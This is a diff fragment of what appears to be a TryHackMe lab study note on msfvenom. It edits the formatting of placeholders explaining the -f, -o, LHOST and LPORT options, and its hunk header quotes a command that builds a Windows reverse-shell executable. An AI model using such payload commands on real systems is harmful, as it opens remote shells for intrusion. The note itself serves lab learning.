@@ -438,13 +438,13 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 <img width="852" height="124" alt="image" src="https://github.com/user-attachments/assets/034dbbbd-4df7-4a90-8d4e-4022b7a81d93" />
 
 Here we are using a payload and four options:  
--f <format>  
+-f _format_  
 Specifies the output format. In this case that is an executable (exe)  
--o <file>  
+-o _file_  
 The output location and filename for the generated payload.  
-LHOST=<IP>  
+LHOST=_IP_  
 Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address(opens in new tab). If you cannot load the link then you are not connected to the VPN.  
-LPORT=<port>  
+LPORT=_port_  
 The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.  
 
 ---
